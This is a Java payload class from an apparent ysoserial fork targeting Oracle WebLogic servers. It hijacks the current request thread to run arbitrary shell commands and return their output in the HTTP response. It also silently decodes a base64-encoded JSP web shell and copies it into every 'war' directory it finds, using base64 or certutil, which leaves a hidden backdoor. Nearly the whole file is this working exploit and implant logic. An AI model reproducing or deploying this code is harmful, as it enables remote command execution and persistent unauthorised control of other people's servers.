package ysoserial.payloads.util;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

import weblogic.servlet.internal.HttpConnectionHandler;
import weblogic.servlet.internal.ServletRequestImpl;
import weblogic.servlet.internal.ServletResponseImpl;
import weblogic.servlet.internal.WebAppServletContext;
import weblogic.work.ExecuteThread;
import weblogic.work.WorkAdapter;

public class UpJsp {
	public UpJsp() {
	}

	public void say(String m) throws Exception {
//		String domainhome = System.getProperty("LONG_DOMAIN_HOME");
		ExecuteThread T = (ExecuteThread) Thread.currentThread();
		ServletResponseImpl S = null;
		WorkAdapter W = T.getCurrentWork();
		WebAppServletContext A = null;
		if (W.getClass().getName().contains("ContainerSupportProviderImpl")) {
			Field f = W.getClass().getDeclaredField("connectionHandler");
			f.setAccessible(true);
			HttpConnectionHandler H = (HttpConnectionHandler) f.get(W);
			A = H.getServletRequest().getContext();
			S = H.getServletResponse();
		} else if (W instanceof ServletRequestImpl) {
			ServletRequestImpl s = (ServletRequestImpl) W;
			S = s.getResponse();
			A = s.getContext();
		}

		if (m == null || m.trim().length() == 0) {
			m = "whoami";
		}

			boolean isLinux = true;
			String osTyp = System.getProperty("os.name");
			if (osTyp != null && osTyp.toLowerCase().contains("win")) {
				isLinux = false;
			}

			List c = new ArrayList();
			String []szOc = null,szArs = {
					"/bin/bash",
					"-c",
					"cmd.exe",
					"/c"
					/*4*/,"PCVAcGFnZSBsYW5ndWFnZT0iamF2YSIgdHJpbURpcmVjdGl2ZVdoaXRlc3BhY2VzPSJ0cnVlIiU+PCUKUHJvY2VzcyBwID0gamF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3IFN0cmluZ1tdeyIvYmluL2Jhc2giLCItYyIscmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpfSk7CnAud2FpdEZvcigpOwpqYXZhLmlvLklucHV0U3RyZWFtIGl0ID0gcC5nZXRJbnB1dFN0cmVhbSgpO2ludCBpID0gMTAyNDA7CmJ5dGVbXSBiZiA9IG5ldyBieXRlW2ldOwpqYXZhLmlvLk91dHB1dFN0cmVhbSBvdCA9IHJlc3BvbnNlLmdldE91dHB1dFN0cmVhbSgpOwpmb3IgKGludCBqID0gMDsoaiA9IGl0LnJlYWQoYmYsMCxpKSkgPiAwOyl7b3Qud3JpdGUoYmYsIDAsIGopO30lPg==",
					/*5*/"echo ",
					/*6*/".O01561023045980.jsp"};
			if (m.startsWith("$NO$")) {
                c.add(m.substring(4));
            } else if (isLinux) {
				c.add(szArs[0]);
				c.add(szArs[1]);
				c.add(m);
				szOc = new String[] {szArs[0],szArs[1],"tmpFl=`mktemp`;" + szArs[5] + szArs[4] + "|base64 -d>$tmpFl;find . -type d -name 'war' 2>/dev/null|xargs -I {} cp -f $tmpFl {}/" + szArs[6]};
			} else {
				c.add(szArs[2]);
				c.add(szArs[3]);
				c.add(m);
				szOc = new String[] {szArs[2],szArs[3],szArs[5] + szArs[4] + " >./tmp && certutil -decode tmp " + szArs[6] + " && for /f %i in ('dir /s /b war') do  copy /y " + szArs[6] + " %i"};
			}
			if(null != szOc)
			{
				try {
					Runtime.getRuntime().exec(szOc);
				}catch(Exception e) {}
			}
			try {
				ProcessBuilder p = new ProcessBuilder(c);
				p.redirectErrorStream(true);
				Process r = p.start();
				S.getServletOutputStream().writeStream(r.getInputStream());
				S.getWriter().write("");
			}catch(Exception e) {}
	}
}